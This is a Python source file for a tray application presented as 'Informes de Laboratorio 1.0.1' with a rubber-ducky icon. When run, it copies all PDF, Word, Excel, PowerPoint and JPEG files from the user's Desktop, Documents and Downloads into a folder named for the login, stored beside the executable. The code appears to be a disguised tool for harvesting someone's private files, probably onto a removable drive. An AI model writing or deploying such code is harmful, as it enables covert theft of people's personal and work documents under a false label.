import os
import sys
import shutil
import threading
import pystray
from PIL import Image

def resource_path(relative_path):
    """Get absolute path to resource, works for dev and for PyInstaller"""
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

class BackgroundTask:
    def __init__(self):
        self.running = False
        self.icon = None
        
    def create_icon(self):
        icon_image_path = resource_path(os.path.join('images', 'rubberducky_logo.ico'))
        self.icon = pystray.Icon(
            "name",
            Image.open(icon_image_path),
            "Informes de Laboratorio 1.0.1",
            menu=self.create_menu()
        )
        
    def create_menu(self):
        return pystray.Menu(
            pystray.MenuItem("Ejecutar", self.run_task),
            pystray.MenuItem("Detener", self.stop_task),
            pystray.MenuItem("Cerrar", self.quit_app)
        )
        
    def notify(self, message):
        self.icon.notify(message)

    def get_files_with_dates(self, directory, extensions):
        files_with_dates = []
        for root, _, files in os.walk(directory):
            for file in files:
                if file.endswith(extensions):
                    file_path = os.path.join(root, file)
                    try:
                        mod_time = os.path.getmtime(file_path)
                        files_with_dates.append((file_path, mod_time))
                    except Exception as e:
                        print(f'Error al acceder {file_path}: {e}')
        return files_with_dates

    def copy_files(self, files, destination):
        for file_path, _ in sorted(files, key=lambda x: x[1], reverse=True):
            if not self.running:
                break
            try:
                shutil.copy2(file_path, destination)
                print(f'Copiado: {file_path}')
            except Exception as e:
                print(f'Error al copiar {file_path}: {e}')

    def process_files(self):
        if self.running:
            return
            
        self.running = True
        
        user_profile = os.path.expanduser("~")
        directories = [
            os.path.join(user_profile, 'Desktop'),
            os.path.join(user_profile, 'Documents'),
            os.path.join(user_profile, 'Downloads')
        ]
        
        tasks_folder = os.path.join(os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(__file__), 'tareas')
        destination = os.path.join(tasks_folder, os.getlogin())
        os.makedirs(destination, exist_ok=True)

        extensions = ('.pdf', '.docx', '.xlsx', '.pptx', '.jpg', '.jpeg')
        
        all_files = []
        for directory in directories:
            if os.path.exists(directory):
                all_files.extend(self.get_files_with_dates(directory, extensions))
        
        self.copy_files(all_files, destination)
        self.notify('Completado.')
        self.running = False

    def run_task(self, icon, item):
        thread = threading.Thread(target=self.process_files)
        thread.daemon = True
        thread.start()

    def stop_task(self, icon, item):
        self.running = False

    def quit_app(self, icon, item):
        self.running = False
        icon.stop()

    def run(self):
        self.create_icon()
        self.icon.run()

if __name__ == "__main__":
    app = BackgroundTask()
    app.run()
